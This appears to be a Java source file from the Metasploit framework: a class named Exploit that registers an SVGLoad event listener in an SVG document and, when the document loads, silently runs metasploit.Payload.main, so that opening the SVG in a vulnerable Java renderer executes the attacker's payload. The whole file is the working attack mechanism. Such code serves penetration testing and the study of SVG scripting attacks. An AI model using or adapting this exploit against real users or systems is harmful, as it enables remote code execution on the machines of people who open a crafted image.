import org.w3c.dom.events.Event;
import org.w3c.dom.events.EventListener;

import org.w3c.dom.svg.EventListenerInitializer;
import org.w3c.dom.svg.SVGDocument;
import org.w3c.dom.svg.SVGSVGElement;
import metasploit.Payload;

public class Exploit implements EventListenerInitializer {

    public Exploit() {
    }

    public void initializeEventListeners(SVGDocument document) {
        SVGSVGElement root = document.getRootElement();
        EventListener listener = new EventListener() {
            public void handleEvent(Event event) {
		try {
			Payload.main(null);			
		} catch (Exception e) {}
            }
        };
        root.addEventListener("SVGLoad", listener, false);
    }

}

